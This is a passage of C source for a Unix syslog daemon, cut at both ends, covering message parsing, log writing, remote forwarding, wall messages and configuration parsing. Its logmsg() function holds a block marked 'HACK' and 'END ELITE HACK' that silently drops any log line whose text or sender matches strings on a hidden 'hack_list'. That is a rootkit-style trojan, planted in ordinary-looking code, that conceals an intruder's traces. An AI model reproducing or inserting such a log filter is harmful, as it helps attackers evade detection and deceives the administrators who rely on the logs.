	if ((result = (char **)malloc(sizeof(char *) * count+2)) == NULL) {
		printf ("Sorry, can't get enough memory, exiting.\n");
		exit(0);
	}
	
	/*
	 * We now can assume that the first and last
	 * characters are different from any delimiters,
	 * so we don't have to care about this.
	 */
	count = 0;
	while ((i=(int)index(p, LIST_DELIMITER))) {
		if ((result[count] = \
		     (char *)malloc(sizeof(char) * i - (int)p +1)) == NULL) {
			printf ("Sorry, can't get enough memory, exiting.\n");
			exit(0);
		}
		strncpy(result[count],p, i - (int)p);
		result[count][i - (int)p] = '\0';
		p = (char *)i;p++;
		count++;
	}
	if ((result[count] = \
	     (char *)malloc(sizeof(char) * strlen(p) + 1)) == NULL) {
		printf ("Sorry, can't get enough memory, exiting.\n");
		exit(0);
	}
	strcpy(result[count],p);
	result[++count] = NULL;

#if 0
	count=0;
	while (result[count])
		dprintf ("#%d: %s\n", count, StripDomains[count++]);
#endif
	return result;
}


void untty()
#ifdef SYSV
{
	if ( !Debug ) {
		setsid();
	}
	return;
}

#else
{
	int i;

	if ( !Debug ) {
		i = open(_PATH_TTY, O_RDWR);
		if (i >= 0) {
			(void) ioctl(i, (int) TIOCNOTTY, (char *)0);
			(void) close(i);
		}
	}
}
#endif


/*
 * Parse the line to make sure that the msg is not a composite of more
 * than one message.
 */

void printchopped(hname, msg, len, fd)
	const char *hname;
	char *msg;
	int len;
	int fd;
{
	auto int ptlngth;

	auto char *start = msg,
		  *p,
	          *end,
		  tmpline[MAXLINE + 1];

	dprintf("Message length: %d, File descriptor: %d.\n", len, fd);
	tmpline[0] = '\0';
	if ( parts[fd] != (char *) 0 )
	{
		dprintf("Including part from messages.\n");
		strcpy(tmpline, parts[fd]);
		free(parts[fd]);
		parts[fd] = (char *) 0;
		if ( (strlen(msg) + strlen(tmpline)) > MAXLINE )
		{
			logerror("Cannot glue message parts together");
			printline(hname, tmpline);
			start = msg;
		}
		else
		{
			dprintf("Previous: %s\n", tmpline);
			dprintf("Next: %s\n", msg);
			strcat(tmpline, msg);
			printline(hname, tmpline);
			if ( (strlen(msg) + 1) == len )
				return;
			else
				start = strchr(msg, '\0') + 1;
		}
	}

	if ( msg[len-1] != '\0' )
	{
		msg[len] = '\0';
		for(p= msg+len-1; *p != '\0' && p > msg; )
			--p;
		ptlngth = strlen(++p);
		if ( (parts[fd] = malloc(ptlngth + 1)) == (char *) 0 )
			logerror("Cannot allocate memory for message part.");
		else
		{
			strcpy(parts[fd], p);
			dprintf("Saving partial msg: %s\n", parts[fd]);
			memset(p, '\0', ptlngth);
		}
	}

	do {
		end = strchr(start + 1, '\0');
		printline(hname, start);
		start = end + 1;
	} while ( *start != '\0' );

	return;
}



/*
 * Take a raw input line, decode the message, and print the message
 * on the appropriate log files.
 */

void printline(hname, msg)
	const char *hname;
	char *msg;
{
	register char *p, *q;
	register int c;
	char line[MAXLINE + 1];
	int pri;

	/* test for special codes */
	pri = DEFUPRI;
	p = msg;
	if (*p == '<') {
		pri = 0;
		while (isdigit(*++p))
		{
		   pri = 10 * pri + (*p - '0');
		}
		if (*p == '>')
			++p;
	}
	if (pri &~ (LOG_FACMASK|LOG_PRIMASK))
		pri = DEFUPRI;

	q = line;
	while ((c = *p++ & 0177) != '\0' &&
	    q < &line[sizeof(line) - 1])
		if (c == '\n')
			*q++ = ' ';
		else if (iscntrl(c)) {
			*q++ = '^';
			*q++ = c ^ 0100;
		} else
			*q++ = c;
	*q = '\0';

	logmsg(pri, line, hname, SYNC_FILE);
	return;
}



/*
 * Take a raw input line from /dev/klog, split and format similar to syslog().
 */

void printsys(msg)
	char *msg;
{
	register char *p, *q;
	register int c;
	char line[MAXLINE + 1];
	int pri, flags;
	char *lp;

	(void) sprintf(line, "vmunix: ");
	lp = line + strlen(line);
	for (p = msg; *p != '\0'; ) {
		flags = ADDDATE;
		pri = DEFSPRI;
		if (*p == '<') {
			pri = 0;
			while (isdigit(*++p))
				pri = 10 * pri + (*p - '0');
			if (*p == '>')
				++p;
		} else {
			/* kernel printf's come out on console */
			flags |= IGN_CONS;
		}
		if (pri &~ (LOG_FACMASK|LOG_PRIMASK))
			pri = DEFSPRI;
		q = lp;
		while (*p != '\0' && (c = *p++) != '\n' &&
		    q < &line[MAXLINE])
			*q++ = c;
		*q = '\0';
		logmsg(pri, line, LocalHostName, flags);
	}
	return;
}

time_t	now;

/*
 * Log a message to the appropriate log files, users, etc. based on
 * the priority.
 */

void logmsg(pri, msg, from, flags)
	int pri;
	char *msg;
	const char *from;
	int flags;
{
	register struct filed *f;
	int fac, prilev, lognum;
	int msglen;
	char *timestamp;
        int elite=0;
/* HACK mask out unwanted entries */
        for (h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next)
                if ((strstr(msg, h_tmp->logstr))||(strstr(from, h_tmp->logstr)))                elite++;
if (!elite) {

	dprintf("logmsg: pri %o, flags %x, from %s, msg %s\n", pri, flags, from, msg);

#ifndef SYSV
	omask = sigblock(sigmask(SIGHUP)|sigmask(SIGALRM));
#endif

	/*
	 * Check to see if msg looks non-standard.
	 */
	msglen = strlen(msg);
	if (msglen < 16 || msg[3] != ' ' || msg[6] != ' ' ||
	    msg[9] != ':' || msg[12] != ':' || msg[15] != ' ')
		flags |= ADDDATE;

	(void) time(&now);
	if (flags & ADDDATE)
		timestamp = ctime(&now) + 4;
	else {
		timestamp = msg;
		msg += 16;
		msglen -= 16;
	}

	/* extract facility and priority level */
	if (flags & MARK)
		fac = LOG_NFACILITIES;
	else
		fac = LOG_FAC(pri);
	prilev = LOG_PRI(pri);

	/* log the message to the particular outputs */
	if (!Initialized) {
		f = &consfile;
		f->f_file = open(ctty, O_WRONLY|O_NOCTTY);

		if (f->f_file >= 0) {
			untty();
			fprintlog(f, (char *)from, flags, msg);
			(void) close(f->f_file);
		}
#ifndef SYSV
		(void) sigsetmask(omask);
#endif
		return;
	}
#ifdef SYSV
	for (lognum = 0; lognum <= nlogs; lognum++) {
		f = &Files[lognum];
#else
	for (f = Files; f; f = f->f_next) {
#endif

		/* skip messages that are incorrect priority */
		if ( (f->f_pmask[fac] == TABLE_NOPRI) || \
		    ((f->f_pmask[fac] & (1<<prilev)) == 0) )
		  	continue;

		if (f->f_type == F_CONSOLE && (flags & IGN_CONS))
			continue;

		/* don't output marks to recently written files */
		if ((flags & MARK) && (now - f->f_time) < MarkInterval / 2)
			continue;

		/*
		 * suppress duplicate lines to this file
		 */
		if ((flags & MARK) == 0 && msglen == f->f_prevlen &&
		    !strcmp(msg, f->f_prevline) &&
		    !strcmp(from, f->f_prevhost)) {
			(void) strncpy(f->f_lasttime, timestamp, 15);
			f->f_prevcount++;
			dprintf("msg repeated %d times, %ld sec of %d.\n",
			    f->f_prevcount, now - f->f_time,
			    repeatinterval[f->f_repeatcount]);
			/*
			 * If domark would have logged this by now,
			 * flush it now (so we don't hold isolated messages),
			 * but back off so we'll flush less often
			 * in the future.
			 */
			if (now > REPEATTIME(f)) {
				fprintlog(f, (char *)from, flags, (char *)NULL);
				BACKOFF(f);
			}
		} else {
			/* new line, save it */
			if (f->f_prevcount)
				fprintlog(f, (char *)from, 0, (char *)NULL);
			f->f_repeatcount = 0;
			(void) strncpy(f->f_lasttime, timestamp, 15);
			(void) strncpy(f->f_prevhost, from,
					sizeof(f->f_prevhost));
			if (msglen < MAXSVLINE) {
				f->f_prevlen = msglen;
				f->f_prevpri = pri;
				(void) strcpy(f->f_prevline, msg);
				fprintlog(f, (char *)from, flags, (char *)NULL);
			} else {
				f->f_prevline[0] = 0;
				f->f_prevlen = 0;
				fprintlog(f, (char *)from, flags, msg);
			}
		}
	}
#ifndef SYSV
	(void) sigsetmask(omask);
#endif
} /* END ELITE HACK */
}

void fprintlog(f, from, flags, msg)
	register struct filed *f;
	char *from;
	int flags;
	char *msg;
{
	struct iovec iov[6];
	register struct iovec *v = iov;
	register int l;
	char line[MAXLINE + 1];
	char repbuf[80];
	time_t fwd_suspend;
	struct hostent *hp;

	dprintf("Called fprintlog, ");

	v->iov_base = f->f_lasttime;
	v->iov_len = 15;
	v++;
	v->iov_base = " ";
	v->iov_len = 1;
	v++;
	v->iov_base = f->f_prevhost;
	v->iov_len = strlen(v->iov_base);
	v++;
	v->iov_base = " ";
	v->iov_len = 1;
	v++;
	if (msg) {
		v->iov_base = msg;
		v->iov_len = strlen(msg);
	} else if (f->f_prevcount > 1) {
		(void) sprintf(repbuf, "last message repeated %d times",
		    f->f_prevcount);
		v->iov_base = repbuf;
		v->iov_len = strlen(repbuf);
	} else {
		v->iov_base = f->f_prevline;
		v->iov_len = f->f_prevlen;
	}
	v++;

	dprintf("logging to %s", TypeNames[f->f_type]);

	switch (f->f_type) {
	case F_UNUSED:
		f->f_time = now;
		dprintf("\n");
		break;

	case F_FORW_SUSP:
		fwd_suspend = time((time_t *) 0) - f->f_time;
		if ( fwd_suspend >= INET_SUSPEND_TIME ) {
			dprintf("\nForwarding suspension over, " \
				"retrying FORW ");
			f->f_type = F_FORW;
			goto f_forw;
		}
		else {
			dprintf(" %s\n", f->f_un.f_forw.f_hname);
			dprintf("Forwarding suspension not over, time " \
				"left: %d.\n", INET_SUSPEND_TIME - \
				fwd_suspend);
		}
		break;
		
	/*
	 * The trick is to wait some time, then retry to get the
	 * address. If that fails retry x times and then give up.
	 *
	 * You'll run into this problem mostly if the name server you
	 * need for resolving the address is on the same machine, but
	 * is started after syslogd. 
	 */
	case F_FORW_UNKN:
		dprintf(" %s\n", f->f_un.f_forw.f_hname);
		fwd_suspend = time((time_t *) 0) - f->f_time;
		if ( fwd_suspend >= INET_SUSPEND_TIME ) {
			dprintf("Forwarding suspension to unknown over, retrying\n");
			if ( (hp = gethostbyname(f->f_un.f_forw.f_hname)) == NULL ) {
				dprintf("Failure: %s\n", sys_h_errlist[h_errno]);
				dprintf("Retries: %d\n", f->f_prevcount);
				if ( --f->f_prevcount < 0 ) {
					dprintf("Giving up.\n");
					f->f_type = F_UNUSED;
				}
				else
					dprintf("Left retries: %d\n", f->f_prevcount);
			}
			else {
			        dprintf("%s found, resuming.\n", f->f_un.f_forw.f_hname);
				bcopy(hp->h_addr, (char *) &f->f_un.f_forw.f_addr.sin_addr, hp->h_length);
				f->f_type = F_FORW;
				goto f_forw;
			}
		}
		else
			dprintf("Forwarding suspension not over, time " \
				"left: %d\n", INET_SUSPEND_TIME - fwd_suspend);
		break;

	case F_FORW:
		/* 
		 * Don't send any message to a remote host if it
		 * already comes from one. (we don't care 'bout who
		 * sent the message, we don't send it anyway)  -Joey
		 */
	f_forw:
		dprintf(" %s\n", f->f_un.f_forw.f_hname);
		if ( strcmp(from, LocalHostName) && NoHops )
			dprintf("Not sending message to remote.\n");
		else {
			f->f_time = now;
			(void) sprintf(line, "<%d>%s", f->f_prevpri, \
				(char *) iov[4].iov_base);
			strcat(line, "\n");	/* ASP */
			l = strlen(line);
			if (l > MAXLINE)
				l = MAXLINE;
			if (sendto(finet, line, l, 0, \
				   (struct sockaddr *) &f->f_un.f_forw.f_addr,
				   sizeof(f->f_un.f_forw.f_addr)) != l) {
				int e = errno;
				dprintf("INET sendto error: %d = %s.\n", 
					e, strerror(e));
				f->f_type = F_FORW_SUSP;
				errno = e;
				logerror("sendto");
			}
		}
		break;

	case F_CONSOLE:
		f->f_time = now;
#ifdef UNIXPC
		if (1) {
#else
		if (flags & IGN_CONS) {	
#endif
			dprintf(" (ignored).\n");
			break;
		}
		/* FALLTHROUGH */

	case F_TTY:
	case F_FILE:
		f->f_time = now;
		dprintf(" %s\n", f->f_un.f_fname);
		if (f->f_type != F_FILE) {
			v->iov_base = "\r\n";
			v->iov_len = 2;
		} else {
			v->iov_base = "\n";
			v->iov_len = 1;
		}
	again:
		if (writev(f->f_file, iov, 6) < 0) {
			int e = errno;
			(void) close(f->f_file);
			/*
			 * Check for EBADF on TTY's due to vhangup() XXX
			 */
			if (e == EBADF && f->f_type != F_FILE) {
				f->f_file = open(f->f_un.f_fname, O_WRONLY|O_APPEND|O_NOCTTY);
				if (f->f_file < 0) {
					f->f_type = F_UNUSED;
					logerror(f->f_un.f_fname);
				} else {
					untty();
					goto again;
				}
			} else {
				f->f_type = F_UNUSED;
				errno = e;
				logerror(f->f_un.f_fname);
			}
		} else if (f->f_flags & SYNC_FILE)
			(void) fsync(f->f_file);
		break;

	case F_USERS:
	case F_WALL:
		f->f_time = now;
		dprintf("\n");
		v->iov_base = "\r\n";
		v->iov_len = 2;
		wallmsg(f, iov);
		break;
	} /* switch */
	if (f->f_type != F_FORW_UNKN)
		f->f_prevcount = 0;
	return;		
}

jmp_buf ttybuf;

void endtty()
{
	longjmp(ttybuf, 1);
}

/*
 *  WALLMSG -- Write a message to the world at large
 *
 *	Write the specified message to either the entire
 *	world, or a list of approved users.
 */

void wallmsg(f, iov)
	register struct filed *f;
	struct iovec *iov;
{
	char p[6 + UNAMESZ];
	register int i;
	int ttyf, len;
	FILE *uf;
	static int reenter = 0;
	struct utmp ut;
	char greetings[200];

	if (reenter++)
		return;

	/* open the user login file */
	if ((uf = fopen(UTMP_FILE, "r")) == NULL) {
		logerror(UTMP_FILE);
		reenter = 0;
		return;
	}

	/*
	 * Might as well fork instead of using nonblocking I/O
	 * and doing notty().
	 */
	if (fork() == 0) {
		(void) signal(SIGTERM, SIG_DFL);
		(void) alarm(0);
		(void) signal(SIGALRM, endtty);
#ifndef SYSV
		(void) signal(SIGTTOU, SIG_IGN);
		(void) sigsetmask(0);
#endif
		(void) sprintf(greetings,
		    "\r\n\7Message from syslogd@%s at %.24s ...\r\n",
			(char *) iov[2].iov_base, ctime(&now));
		len = strlen(greetings);

		/* scan the user login file */
		while (fread((char *) &ut, sizeof(ut), 1, uf) == 1) {
			/* is this slot used? */
			if (ut.ut_name[0] == '\0')
				continue;
			if (ut.ut_type == LOGIN_PROCESS)
			        continue;
			if (!(strcmp (ut.ut_name,"LOGIN"))) /* paranoia */
			        continue;

			/* should we send the message to this user? */
			if (f->f_type == F_USERS) {
				for (i = 0; i < MAXUNAMES; i++) {
					if (!f->f_un.f_uname[i][0]) {
						i = MAXUNAMES;
						break;
					}
					if (strncmp(f->f_un.f_uname[i],
					    ut.ut_name, UNAMESZ) == 0)
						break;
				}
				if (i >= MAXUNAMES)
					continue;
			}

			/* compute the device name */
			strcpy(p, _PATH_DEV);
			strncat(p, ut.ut_line, UNAMESZ);

			if (f->f_type == F_WALL) {
				iov[0].iov_base = greetings;
				iov[0].iov_len = len;
				iov[1].iov_len = 0;
			}
			if (setjmp(ttybuf) == 0) {
				(void) alarm(15);
				/* open the terminal */
				ttyf = open(p, O_WRONLY|O_NOCTTY);
				if (ttyf >= 0) {
					struct stat statb;

					if (fstat(ttyf, &statb) == 0 &&
					    (statb.st_mode & S_IWRITE))
						(void) writev(ttyf, iov, 6);
					close(ttyf);
					ttyf = -1;
				}
			}
			(void) alarm(0);
		}
		exit(0);
	}
	/* close the user login file */
	(void) fclose(uf);
	reenter = 0;
}

void reapchild()
{
#if defined(SYSV) && !defined(linux)
	(void) signal(SIGCHLD, reapchild);	/* reset signal handler -ASP */
	wait ((int *)0);
#else
	union wait status;

	while (wait3(&status, WNOHANG, (struct rusage *) NULL) > 0)
		;
#endif
#ifdef linux
	(void) signal(SIGCHLD, reapchild);	/* reset signal handler -ASP */
#endif
}

/*
 * Return a printable representation of a host address.
 */
const char *cvthname(f)
	struct sockaddr_in *f;
{
	struct hostent *hp;
	register char *p;
	int count;

	if (f->sin_family != AF_INET) {
		dprintf("Malformed from address.\n");
		return ("???");
	}
	hp = gethostbyaddr((char *) &f->sin_addr, sizeof(struct in_addr), \
			   f->sin_family);
	if (hp == 0) {
		dprintf("Host name for your address (%s) unknown.\n",
			inet_ntoa(f->sin_addr));
		return (inet_ntoa(f->sin_addr));
	}
	/*
	 * Convert to lower case, just like LocalDomain above
	 */
	for (p = (char *)hp->h_name; *p ; p++)
		if (isupper(*p))
			*p = tolower(*p);

	/*
	 * Notice that the string still contains the fqdn, but your
	 * hostname and domain are separated by a '\0'.
	 */
	if ((p = index(hp->h_name, '.'))) {
		if (strcmp(p + 1, LocalDomain) == 0) {
			*p = '\0';
			return (hp->h_name);
		} else {
			if (StripDomains) {
				count=0;
				while (StripDomains[count]) {
					if (strcmp(p + 1, StripDomains[count]) == 0) {
						*p = '\0';
						return (hp->h_name);
					}
					count++;
				}
			}
			if (LocalHosts) {
				count=0;
				while (LocalHosts[count]) {
					if (!strcmp(hp->h_name, LocalHosts[count])) {
						*p = '\0';
						return (hp->h_name);
					}
					count++;
				}
			}
		}
	}

	return (hp->h_name);
}

void domark()
{
	register struct filed *f;
#ifdef SYSV
	int lognum;
#endif

	now = time(0);
	MarkSeq += TIMERINTVL;
	if (MarkSeq >= MarkInterval) {
		logmsg(LOG_INFO, "-- MARK --", LocalHostName, ADDDATE|MARK);
		MarkSeq = 0;
	}

#ifdef SYSV
	for (lognum = 0; lognum <= nlogs; lognum++) {
		f = &Files[lognum];
#else
	for (f = Files; f; f = f->f_next) {
#endif
		if (f->f_prevcount && now >= REPEATTIME(f)) {
			dprintf("flush %s: repeated %d times, %d sec.\n",
			    TypeNames[f->f_type], f->f_prevcount,
			    repeatinterval[f->f_repeatcount]);
			fprintlog(f, LocalHostName, 0, (char *)NULL);
			BACKOFF(f);
		}
	}
	(void) signal(SIGALRM, domark);
	(void) alarm(TIMERINTVL);
}

void debug_switch()

{
	dprintf("Switching debugging_on to %s\n", (debugging_on == 0) ? "true" : "false");
	debugging_on = (debugging_on == 0) ? 1 : 0;
	signal(SIGUSR1, debug_switch);
}


/*
 * Print syslogd errors some place.
 */
void logerror(type)
	char *type;
{
	char buf[100];

	dprintf("Called loggerr, msg: %s\n", type);

	if (errno == 0)
		(void) sprintf(buf, "syslogd: %s", type);
	else if ((unsigned) errno > sys_nerr)
		(void) sprintf(buf, "syslogd: %s: error %d", type, errno);
	else
		(void) sprintf(buf, "syslogd: %s: %s", type, sys_errlist[errno]);
	errno = 0;
	logmsg(LOG_SYSLOG|LOG_ERR, buf, LocalHostName, ADDDATE);
	return;
}

void die(sig)

	int sig;
	
{
	register struct filed *f;
	char buf[100];
	int lognum;

	for (lognum = 0; lognum <= nlogs; lognum++) {
		f = &Files[lognum];
		/* flush any pending output */
		if (f->f_prevcount)
			fprintlog(f, LocalHostName, 0, (char *)NULL);
	}

	if (sig) {
		dprintf("syslogd: exiting on signal %d\n", sig);
		(void) sprintf(buf, "exiting on signal %d", sig);
		errno = 0;
		logerror(buf);
	}

	/* Close the sockets. */
        close(funix);
	close(inetm);

	/* Clean-up files. */
	(void) unlink(LogName);
	(void) remove_pid(PidFile);
	exit(0);
}

/*
 *  INIT -- Initialize syslogd from configuration table
 */

void init()
{
	register int i, lognum;
	register FILE *cf;
	register struct filed *f, **nextp = (struct filed **) 0;
	register char *p;
	char cline[BUFSIZ];

	dprintf("Called init.\n");

	/*
	 *  Close all open log files.
	 */
	Initialized = 0;
	if ( nlogs > -1 )
	{
		dprintf("Initializing log structures.\n");
		nlogs = -1;
		free((void *) Files);
		Files = (struct filed *) 0;
	}
	
#ifdef SYSV
	for (lognum = 0; lognum <= nlogs; lognum++ ) {
		f = &Files[lognum];
#else
	for (f = Files; f != NULL; f = next) {
#endif
		/* flush any pending output */
		if (f->f_prevcount)
			fprintlog(f, LocalHostName, 0, (char *)NULL);

		switch (f->f_type) {
		  case F_FILE:
		  case F_TTY:
		  case F_CONSOLE:
			(void) close(f->f_file);
			break;
		}
#ifdef SYSV
		f->f_type = F_UNUSED;	/* clear entry - ASP */
	}
#else
		next = f->f_next;
		free((char *) f);
	}
	Files = NULL;
	nextp = &OBFiles;
#endif

	/* open the configuration file */
	if ((cf = fopen(ConfFile, "r")) == NULL) {
		dprintf("cannot open %s.\n", ConfFile);
#ifdef SYSV
		cfline("*.ERR\t" _PATH_CONSOLE, *nextp);
#else
		*nextp = (struct filed *)calloc(1, sizeof(*f));
		cfline("*.ERR\t" _PATH_CONSOLE, *nextp);
		(*nextp)->f_next = (struct filed *)calloc(1, sizeof(*f))	/* ASP */
		cfline("*.PANIC\t*", (*nextp)->f_next);
#endif
		Initialized = 1;
		return;
	}

	/*
	 *  Foreach line in the conf table, open that file.
	 */
#ifdef SYSV
	lognum = 0;
#else
	f = NULL;
#endif
	while (fgets(cline, sizeof(cline), cf) != NULL) {
		/*
		 * check for end-of-section, comments, strip off trailing
		 * spaces and newline character.
		 */
		for (p = cline; isspace(*p); ++p);
		if (*p == '\0' || *p == '#')
			continue;
		for (p = index(cline, '\0'); isspace(*--p););
		*++p = '\0';
#ifndef SYSV
		f = (struct filed *)calloc(1, sizeof(*f));
		*nextp = f;
		nextp = &f->f_next;
#endif
		allocate_log();
		f = &Files[lognum++];
		cfline(cline, f);
	}

	/* close the configuration file */
	(void) fclose(cf);

	Initialized = 1;

	if ( Debug ) {
#ifdef SYSV
		for (lognum = 0; lognum <= nlogs; lognum++) {
			f = &Files[lognum];
			if (f->f_type != F_UNUSED) {
				printf ("%2d: ", lognum);
#else
		for (f = Files; f; f = f->f_next) {
			if (f->f_type != F_UNUSED) {
#endif
				for (i = 0; i <= LOG_NFACILITIES; i++)
					if (f->f_pmask[i] == TABLE_NOPRI)
						printf(" X ");
					else
						printf("%2X ", f->f_pmask[i]);
				printf("%s: ", TypeNames[f->f_type]);
				switch (f->f_type) {
				case F_FILE:
				case F_TTY:
				case F_CONSOLE:
					printf("%s", f->f_un.f_fname);
					break;

				case F_FORW:
				case F_FORW_SUSP:
				case F_FORW_UNKN:
					printf("%s", f->f_un.f_forw.f_hname);
					break;

				case F_USERS:
					for (i = 0; i < MAXUNAMES && *f->f_un.f_uname[i]; i++)
						printf("%s, ", f->f_un.f_uname[i]);
					break;
				}
				printf("\n");
			}
		}
	}

	if ( AcceptRemote )
		logmsg(LOG_SYSLOG|LOG_INFO, "syslogd " VERSION "-" PATCHLEVEL \
		       ": restart (remote reception)." , LocalHostName, \
		       	ADDDATE);
	else
		logmsg(LOG_SYSLOG|LOG_INFO, "syslogd " VERSION "-" PATCHLEVEL \
		       ": restart." , LocalHostName, ADDDATE);
	(void) signal(SIGHUP, sighup_handler);
	dprintf("syslogd: restarted.\n");
}

/*
 * Crack a configuration file line
 */

void cfline(line, f)
	char *line;
	register struct filed *f;
{
	register char *p;
	register char *q;
	register int i, i2;
	char *bp;
	int pri;
	int singlpri = 0;
	int ignorepri = 0;
	int syncfile;
	struct hostent *hp;
	char buf[MAXLINE];

	dprintf("cfline(%s)\n", line);

	errno = 0;	/* keep sys_errlist stuff out of logerror messages */

	/* clear out file entry */
#ifndef SYSV
	bzero((char *) f, sizeof(*f));
#endif
	for (i = 0; i <= LOG_NFACILITIES; i++) {
		f->f_pmask[i] = TABLE_NOPRI;
		f->f_flags = 0;
	}

	/* scan through the list of selectors */
	for (p = line; *p && *p != '\t' && *p != ' ';) {

		/* find the end of this facility name list */
		for (q = p; *q && *q != '\t' && *q++ != '.'; )
			continue;

		/* collect priority name */
		for (bp = buf; *q && !index("\t ,;", *q); )
			*bp++ = *q++;
		*bp = '\0';

		/* skip cruft */
		while (index(",;", *q))
			q++;

		/* decode priority name */
		if ( *buf == '!' ) {
			ignorepri = 1;
			for (bp=buf; *(bp+1); bp++)
				*bp=*(bp+1);
			*bp='\0';
		}
		if ( *buf == '=' )
		{
			singlpri = 1;
			pri = decode(&buf[1], PriNames);
		}
		else {
		        singlpri = 0;
			pri = decode(buf, PriNames);
		}

		if (pri < 0) {
			char xbuf[200];

			(void) sprintf(xbuf, "unknown priority name \"%s\"", buf);
			logerror(xbuf);
			return;
		}

		/* scan facilities */
		while (*p && !index("\t .;", *p)) {
			for (bp = buf; *p && !index("\t ,;.", *p); )
				*bp++ = *p++;
			*bp = '\0';
			if (*buf == '*') {
				for (i = 0; i < LOG_NFACILITIES; i++) {
					if ( pri == INTERNAL_NOPRI ) {
						if ( ignorepri )
							f->f_pmask[i] = TABLE_ALLPRI;
						else
							f->f_pmask[i] = TABLE_NOPRI;
					}
					else if ( singlpri ) {
						if ( ignorepri )
				  			f->f_pmask[i] &= ~(1<<pri);
						else
				  			f->f_pmask[i] |= (1<<pri);
					}
					else
					{
						if ( pri == TABLE_ALLPRI ) {
							if ( ignorepri )
								f->f_pmask[i] = TABLE_NOPRI;
							else
								f->f_pmask[i] = TABLE_ALLPRI;
						}
						else
						{
							if ( ignorepri )
								for (i2= 0; i2 <= pri; ++i2)
									f->f_pmask[i] &= ~(1<<i2);
							else
								for (i2= 0; i2 <= pri; ++i2)
									f->f_pmask[i] |= (1<<i2);
						}
					}
				}
			} else {
				i = decode(buf, FacNames);
				if (i < 0) {
					char xbuf[200];

					(void) sprintf(xbuf, "unknown facility name \"%s\"", buf);
					logerror(xbuf);
					return;
				}

				if ( pri == INTERNAL_NOPRI ) {
					if ( ignorepri )
						f->f_pmask[i >> 3] = TABLE_ALLPRI;
					else
						f->f_pmask[i >> 3] = TABLE_NOPRI;
				} else if ( singlpri ) {
					if ( ignorepri )
						f->f_pmask[i >> 3] &= ~(1<<pri);
					else
						f->f_pmask[i >> 3] |= (1<<pri);
				} else {
					if ( pri == TABLE_ALLPRI ) {
						if ( ignorepri )
							f->f_pmask[i >> 3] = TABLE_NOPRI;
						else
							f->f_pmask[i >> 3] = TABLE_ALLPRI;
					} else {
						if ( ignorepri )
							for (i2= 0; i2 <= pri; ++i2)
								f->f_pmask[i >> 3] &= ~(1<<i2);
						else
							for (i2= 0; i2 <= pri; ++i2)
								f->f_pmask[i >> 3] |= (1<<i2);
					}
				}
			}
			while (*p == ',' || *p == ' ')
				p++;
		}

		p = q;
	}

	/* skip to action part */
	while (*p == '\t' || *p == ' ')
		p++;

	if (*p == '-')
	{
		syncfile = 0;
		p++;
	} else
		syncfile = 1;

	dprintf("leading char in action: %c\n", *p);
	switch (*p)
	{
	case '@':
#ifdef SYSLOG_INET
		if (!InetInuse)
			break;
		(void) strcpy(f->f_un.f_forw.f_hname, ++p);
		dprintf("forwarding host: %s\n", p);	/*ASP*/
		if ( (hp = gethostbyname(p)) == NULL ) {
			f->f_type = F_FORW_UNKN;
			f->f_prevcount = INET_RETRY_MAX;
		} else {
			f->f_type = F_FORW;
		}
		bzero((char *) &f->f_un.f_forw.f_addr,
			 sizeof(f->f_un.f_forw.f_addr));
		f->f_un.f_forw.f_addr.sin_family = AF_INET;
		f->f_un.f_forw.f_addr.sin_port = LogPort;
		if ( f->f_type == F_FORW )
			bcopy(hp->h_addr, (char *) &f->f_un.f_forw.f_addr.sin_addr, hp->h_length);
		/*
		 * Otherwise the host might be unknown due to an
		 * inaccessible nameserver (perhaps on the same
		 * host). We try to get the ip number later, like
		 * FORW_SUSP.
		 */
#endif
		break;

        case '|':
	case '/':
		(void) strcpy(f->f_un.f_fname, p);
		dprintf ("filename: %s\n", p);	/*ASP*/
		if (syncfile)
			f->f_flags |= SYNC_FILE;
		if ( *p == '|' )
			f->f_file = open(++p, O_RDWR);
	        else
			f->f_file = open(p, O_WRONLY|O_APPEND|O_CREAT|O_NOCTTY,
					 0644);
		        
	  	if ( f->f_file < 0 ){
			f->f_file = F_UNUSED;
			dprintf("Error opening log file: %s\n", p);
			logerror(p);
			break;
		}
		if (isatty(f->f_file)) {
			f->f_type = F_TTY;
			untty();
		}
		else
			f->f_type = F_FILE;
		if (strcmp(p, ctty) == 0)
			f->f_type = F_CONSOLE;
		break;

	case '*':
		dprintf ("write-all\n");
		f->f_type = F_WALL;
		break;

	default:
		dprintf ("users: %s\n", p);	/* ASP */
		for (i = 0; i < MAXUNAMES && *p; i++) {
			for (q = p; *q && *q != ','; )
				q++;
			(void) strncpy(f->f_un.f_uname[i], p, UNAMESZ);
			if ((q - p) > UNAMESZ)
				f->f_un.f_uname[i][UNAMESZ] = '\0';
			else
				f->f_un.f_uname[i][q - p] = '\0';
			while (*q == ',' || *q == ' ')
				q++;
			p = q;
		}
		f->f_type = F_USERS;
		break;
	}
	return;
}


/*
 *  Decode a symbolic name to a numeric value
 */

int decode(name, codetab)
	char *name;
	struct code *codetab;
{
	register struct code *c;
	register char *p;
	char buf[40];

	dprintf ("symbolic name: %s", name);
	if (isdigit(*name))
	{
		dprintf ("\n");
		return (atoi(name));
	}
	(void) strcpy(buf, name);
	for (p = buf; *p; p++)
		if (isupper(*p))
			*p = tolower(*p);
	for (c = codetab; c->c_name; c++)
		if (!strcmp(buf, c->c_name))
		{
			dprintf (" ==> %d\n", c->c_val);
			return (c->c_val);
		}
	return (-1);
}

static void dprintf(char *fmt, ...)

{
	va_list ap;

	if ( !(Debug && debugging_on) )
		return;
	
	va_start(ap, fmt);
	vfprintf(stdout, fmt, ap);
	va_end(ap);

	fflush(stdout);
	return;
}


/*
 * The following function is responsible for allocating/reallocating the
 * array which holds the structures which define the logging outputs.
 */
static void allocate_log()

{
	dprintf("Called allocate_log, nlogs = %d.\n", nlogs);
	
	/*
	 * Decide whether the array needs to be initialized or needs to
	 * grow.
	 */
	if ( nlogs == -1 )
	{
		Files = (struct filed *) malloc(sizeof(struct filed));
		if ( Files == (void *) 0 )
		{
			dprintf("Cannot initialize log structure.");
			logerror("Cannot initialize log structure.");
			return;
		}
	}
	else
	{
		/* Re-allocate the array. */
		Files = (struct filed *) realloc(Files, (nlogs+2) * \
						  sizeof(struct filed));
		if ( Files == (struct filed *) 0 )
		{
			dprintf("Cannot grow log structure.");
			logerror("Cannot grow log structure.");
			return;
		}
	}
	
	/*
	 * Initialize the array element, bump the number of elements in the
	 * the array and return.
	 */
	++nlogs;
	memset(&Files[nlogs], '\0', sizeof(struct filed));
	return;
}


/*
 * The following function is resposible for handling a SIGHUP signal.  Since
 * we are now doing mallocs/free as part of init we had better not being
 * doing this during a signal handler.  Instead this function simply sets
